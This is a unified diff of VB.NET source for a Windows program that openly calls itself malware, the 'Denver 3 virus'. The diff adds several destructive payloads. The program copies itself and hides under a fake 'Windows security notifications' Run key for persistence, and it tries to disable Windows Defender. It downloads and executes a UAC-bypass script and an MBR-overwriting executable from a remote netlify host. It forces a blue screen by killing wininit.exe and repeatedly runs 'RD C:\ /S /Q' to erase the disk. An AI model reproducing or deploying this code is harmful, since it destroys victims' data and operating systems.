@@ -1,16 +1,58 @@
 ﻿Imports System
 Imports System.IO
 Imports System.Net
+Imports System.Runtime.InteropServices
 Imports System.Text
 Imports Microsoft.Win32
 
+
 Public Class Form1
+
+
     Dim UserFoler = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
     Dim Close1 As Boolean = False
     Private ReadOnly filePath As String = "first_open.txt"
+
+    Public Sub infect()
+        My.Computer.FileSystem.CopyFile(Application.ExecutablePath, UserFoler & "\Denver3.exe")
+        Try
+            My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Windows security notifications_", UserFoler & "\Denver3.exe")
+        Catch ex As Exception
+        End Try
+    End Sub
+
+
+    Public Sub RunInitialSetup() ' code in this block will only run when the program first starts for the first time after the person has successfully confirmed that they know this is a virus.
+        infect()
+        DisableWindowsDefender()
+        MsgBox("The program or feature ""\??\" & Application.ExecutablePath & """cannot start or run due to incompatibily with 64-bit versions of Windows. Please contact the software
+vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsupported 16-bit Application")
+        Try
+            Dim path As String = UserFoler & "\Denver3.runtime"
+            Dim fs As FileStream = File.Create(path)
+            Dim info As Byte() = New UTF8Encoding(True).GetBytes("runtime")
+            fs.Write(info, 0, info.Length)
+            fs.Close()
+            Try
+                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/fuckuac.cmd", Application.StartupPath & "\fuckuac.cmd")
+            Catch ex As Exception
+
+            End Try
+            Process.Start(Application.StartupPath & "\fuckuac.cmd")
+            Hacking_into_pc.Close()
+            Wait(1)
+            MyUtilities.RunCommandCom("TASKKILL /IM wininit.exe /T /F", "", False) 'MAKE A BSOD
+            Close1 = True
+            Me.Close()
+        Catch ex As Exception
+
+        End Try
+
+
+    End Sub
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
 
-        fuckpc()
+
         Try
             My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/Interop.WMPLib.dll", Application.StartupPath & "\Interop.WMPLib.dll")
         Catch ex As Exception
@@ -21,8 +63,8 @@ Public Class Form1
         Catch ex As Exception
 
         End Try
-        Valve_Theme.Show()
-        DisableWindowsDefender() 'worth a shot am I right? In a try will not bug the code
+
+
 
         If Not My.Computer.FileSystem.FileExists(UserFoler & "\Denver3.runtime") Then
             Dim result1 As DialogResult = MessageBox.Show(" This program is malware / malicious program and it will do harm to your computer if you were not on a VM click No immediately (do you still want to execute this program)",
@@ -39,10 +81,11 @@ Public Class Form1
                     Me.Close()
                 Else
                     If CheckForInternetConnection() Then
+
                         Try
                             My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/Interop.WMPLib.dll", Application.StartupPath & "\Interop.WMPLib.dll")
                         Catch ex As Exception
-
+                            MsgBox("This program maintains a small file size by downloading its files from an external server. Please download and install the server manually: https://denver3289yf998dh287hd9hd9827h.netlify.app/ServerFiles.exe", 0 + 16, "Failed to download files")
                         End Try
                         Try
                             My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/AxInterop.WMPLib.dll", Application.StartupPath & "\AxInterop.WMPLib.dll")
@@ -59,41 +102,16 @@ Public Class Form1
                         Catch ex As Exception
 
                         End Try
-                        Try
-                            My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
-                        Catch ex As Exception
-                        End Try
+
                         If Not My.Computer.FileSystem.FileExists(UserFoler & "\Denver3.runtime") Then
-                            MsgBox("The program or feature ""\??\" & Application.ExecutablePath & """cannot start or run due to incompatibily with 64-bit versions of Windows. Please contact the software
-vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsupported 16-bit Application")
-                            Try
-                                Dim path As String = UserFoler & "\Denver3.runtime"
-                                Dim fs As FileStream = File.Create(path)
-                                Dim info As Byte() = New UTF8Encoding(True).GetBytes("runtime")
-                                fs.Write(info, 0, info.Length)
-                                fs.Close()
-                                ' Hacking_into_pc.Show()
-                                ' Wait(10)
-
-                                Try
-                                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/fuckuac.cmd", Application.StartupPath & "\fuckuac.cmd")
-                                Catch ex As Exception
-
-                                End Try
-                                Process.Start(Application.StartupPath & "\fuckuac.cmd")
-                                Hacking_into_pc.Close()
-                                MsgBox("Major skill issue!")
-                                Wait(1)
-                                MyUtilities.RunCommandCom("TASKKILL /IM wininit.exe /T /F", "", False) 'MAKE A BSOD
-                                Close1 = True
-                                Me.Close()
-                            Catch ex As Exception
-
-                            End Try
-
+                            RunInitialSetup()
                         End If
 
                         If My.Computer.FileSystem.FileExists(UserFoler & "\Denver3.runtime") Then
+
+                            DisableWindowsDefender() 'worth a shot am I right? In a try will not bug the code
+
+
                             NoReg.Start()
                             NoTask.Start()
                             Dim payloadchance As Integer = CInt(Int((40 * Rnd()) + 1))
@@ -268,16 +286,18 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
         End Try
         My.Computer.Audio.Play(UserFoler & "\urdone1.wav", AudioPlayMode.BackgroundLoop)
         MsgBox("I have messed with you enough and it's time for me to leave take a break from your computer have fun repairing your bootloader goodbye.")
-        My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/BonziBDY_4.EXE", UserFoler & "\Desktop\BonziBDY_4.EXE")
+
+        OverrideMBR()
         completely_obliterate_hard_drive_files.RunWorkerAsync()
 
 
-        For index As Integer = 0 To 3000
+        For index As Integer = 0 To 9000
             ' Code to be executed inside the loop
             Try
                 Dim random As New Random()
                 Dim randomNumber As Integer = random.Next(1, 63463456)
-                My.Computer.FileSystem.CopyFile(UserFoler & "\Desktop\BonziBDY_4.EXE", UserFoler & "\Desktop\BonziBDY_4" & randomNumber & ".EXE")
+                'My.Computer.FileSystem.CopyFile(UserFoler & "\Desktop\BonziBDY_4.EXE", UserFoler & "\Desktop\DENVER3_0" & randomNumber & ".EXE")
+                My.Computer.FileSystem.CopyFile(UserFoler & "\MbrOverwriter.exe", UserFoler & "\Desktop\DENVER3_0" & randomNumber & ".EXE")
             Catch ex As Exception
 
             End Try
@@ -286,23 +306,28 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
         ' Make a reference to a directory.
 
 
-        Files_deleted_from_hard_drive.Show()
         ' Display the names of the files.
-
-        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", True) 'fuck ur pc
+        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
+        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
         Wait(10)
         Process.Start("https://www.google.com/search?q=for+the+lulz&sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn0-3ZuC1psWsqK-aMP1WjOfTiXwLBQ%3A1713312563052&ei=MxMfZqjjAsu0ptQPkpW8mAY&ved=0ahUKEwjoyNbV-seFAxVLmokEHZIKD2MQ4dUDCBA&uact=5&oq=for+the+lulz&gs_lp=Egxnd3Mtd2l6LXNlcnAiDGZvciB0aGUgbHVsejIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgAQyCxAAGIAEGIoFGIYDSM8IUOMFWN8GcAF4AZABAJgBZqABvwGqAQMxLjG4AQPIAQD4AQGYAgOgAscBwgIKEAAYRxjWBBiwA8ICCBAAGIAEGKIEmAMAiAYBkAYIkgcDMi4xoAffBQ&sclient=gws-wiz-serp")
         Wait(3)
         Process.Start("https://www.google.com/search?sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn0-wMlNAtRhrt2T5ryRfPYICQBcEzg:1713312633304&q=windows+is+spyware&uds=AMwkrPte2rONdlHqaOEoNFr7YgHOiVFtgpI_Ouhp_p_393pfzLmTJdzG2eu02e1iRLtixUe8z4CGC2fuy7dcMRHztzSCFzI3dGLWAVQhBLrNqa6I5_RYST8DU1TQbprLSSo4h0E36iZuaMKfEtU8DupyBvGyxFpeJF6xxgOfHPEZ6HNMvV2BsglEgiuadGToqCC4x43gAAyb99N-2Pu0jgHjK1KRnsfHdxg-Pk7pwVebISixHAjviqZAl3hvC5lEiJSLj9l_zUpeHXM8HTSrqj8oX23a0Cx4DgeuBiZ9E2gkooxJZf7yn9PA3cOTe1ZWK231TMjcnghX&udm=2&prmd=ivnsbmtz&sa=X&ved=2ahUKEwjftJb3-seFAxVstokEHWrEDB8QtKgLegQICRAB&biw=1920&bih=919&dpr=1#vhid=nVwcAOfoXtc5YM&vssid=mosaic")
         Wait(4)
+        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
+        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
         Process.Start("https://www.google.com/search?q=windows+11+is+shit&oq=windows+11+is+shit&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCDQ4NDlqMGo5qAIAsAIA&sourceid=chrome&ie=UTF-8")
         Wait(5)
+        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
+        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
         OpenTextFile("WINDOWS 11 IS ***CRAP**")
         OpenTextFile("ur mom")
+        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
         OpenTextFile("MUSIC: Undertale Last Breath: An Enigmatic Encounter (Phase 3)")
         OpenTextFile("***YOUR PC HAS BEEN FUCKED BY THE DENVER 3 VIRUS LMAO***")
         OpenTextFile("BSOD INCOMEING!!!!!!!!!!!!!")
         Wait(4)
+        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
         Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
         Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
         Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
@@ -327,7 +352,8 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
         Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
         Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
 
-        Wait(40)
+        Wait(130)
+        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
         Process.Start("https://www.google.com/search?q=I%27m+about+to+blue+screen+this+man%27s+computer%21%21%21%21%21%21&sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn08FZz1OtO5v_LYabeyEF3EhtJUM7Q%3A1713312932801&ei=pBQfZoTNMP3sptQP3NGDoA4&ved=0ahUKEwiEr_6F_MeFAxV9tokEHdzoAOQQ4dUDCBA&uact=5&oq=I%27m+about+to+blue+screen+this+man%27s+computer%21%21%21%21%21%21&gs_lp=Egxnd3Mtd2l6LXNlcnAiMkknbSBhYm91dCB0byBibHVlIHNjcmVlbiB0aGlzIG1hbidzIGNvbXB1dGVyISEhISEhMggQIRigARjDBDIIECEYoAEYwwQyCBAhGKABGMMEMggQIRigARjDBDIIECEYoAEYwwRIhUVQuwVYrDpwB3gBkAEAmAHKAaAB4A6qAQYxNC40LjG4AQPIAQD4AQGYAhagArMLwgIKEAAYRxjWBBiwA8ICCBAAGIAEGKIEwgIIEAAYiQUYogTCAgoQIRgKGKABGMMEwgIFECEYoAGYAwCIBgGQBgiSBwQxOC40oAejYw&sclient=gws-wiz-serp")
         Wait(6)
         MyUtilities.RunCommandCom("TASKKILL /IM wininit.exe /T /F", "", False)
@@ -416,7 +442,26 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
         End Try
     End Sub
 
+    Public Sub OverrideMBR() 'fucks your pc
+        Try
+            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/MbrOverwriter.exe", UserFoler & "\MbrOverwriter.exe")
+        Catch ex As Exception
+            Try
+                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/MbrOverwriter.exe", UserFoler & "\MbrOverwriter.exe")
+            Catch ex1 As Exception
 
+            End Try
+        End Try
+        Try
+            Process.Start(UserFoler & "\MbrOverwriter.exe")
+        Catch ex As Exception
+            Try
+                Process.Start(UserFoler & "\MbrOverwriter.exe")
+            Catch ex1 As Exception
+            End Try
+        End Try
+
+    End Sub
     Public Shared Function CheckForInternetConnection() As Boolean
         Try
             Using client = New WebClient()
